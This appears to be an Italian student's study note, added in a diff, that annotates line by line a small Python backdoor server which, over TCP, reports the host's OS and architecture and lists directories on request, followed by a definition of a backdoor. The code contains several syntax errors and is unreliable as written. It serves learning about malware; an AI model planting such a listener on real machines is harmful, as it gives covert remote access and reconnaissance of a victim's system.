@@ -1,0 +1,52 @@
+Analisi corpo del codice:
+
+import socket, platform, os 
+//socket viene utilizzato per scambiare pacchetti tra due PC.
+//platform Indentifica il sistema operativo che si sta utilizzando.
+//os Permette di interagire con il sistema operativo in modo efficace e dinamico.
+
+SRV_ADDR = **
+//variabile utilizzata per memorizzare indirizzo ip
+SRV PORT 1234
+//variabile utilizzata per memorizzare il numero di porta del server
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+//funzione che specifica attraverso AF_INET di volere un IPV4 e con SOCK_STREAM che vogliamo connessione TCP
+s.bind((SRV_ADDR, SRV_PORT))
+//metodo per assocciare il socket ad IP:PORTA
+s.listen(1)
+//configura il socket in ascolto sulla coppia IP:PORTA, (1)backlog max numero di connessioni in coda
+connection, address = s.accept()
+//connection identifica la comunicazione che verrà usata per scambiare dati
+//address l'ip del client che si collega
+//s. accept usato per accettare connessioni in entrata
+while 1:
+//ciclo infinito che utilizzeremo per la ricezione di dati. 1 perchè significa TRUE.
+try
+//utilizzato per iniziare il blocco di codice e in caso di errore passa ad except.
+data connection.recv(1024) 
+//lettura dati ricevuti dal client fino a 1024byte
+except:continue
+//in caso di errore in try, il codice passa a questa fase e quindi in except.
+if(data.decode('utf-8') = '1');
+tosend = platform.platform() + " " + platform.machine() 
+connection.sendall(tosend.encode())
+//in questo caso se i dati decodificati sono "1" il server risponderà con info sulla piattaforma e architettura della macchina.
+elif(data.decode('utf-8') = '2'):
+data connection.recv(1024)
+try:
+filelist = os.listdir(data.decode('utf-8'))
+tosend = ""
+for x in filelist:
+tosend += "," + x
+//se i dati decodificati sono "2" il server riceverà un percorso della richiesta successiva e risponderà con una lista file nella dir. corrispondente.
+except:
+tosend = "Wrong path"
+connection.sendall(tosend.encode())
+elif(data.decode('utf-8') = '0'): 
+connection.close()
+//se i dati decodificati sono '0', il server chiuderà la connessione con il client.
+connection, address = s.accept()
+
+
+Una backdoor è come una porta segreta in un sistema informatico, che permette di entrare senza farsi vedere. È una via di accesso nascosta, spesso creata in modo malintenzionato, che permette di aggirare i normali controlli di sicurezza per accedere al sistema o ai suoi dati senza essere notati.
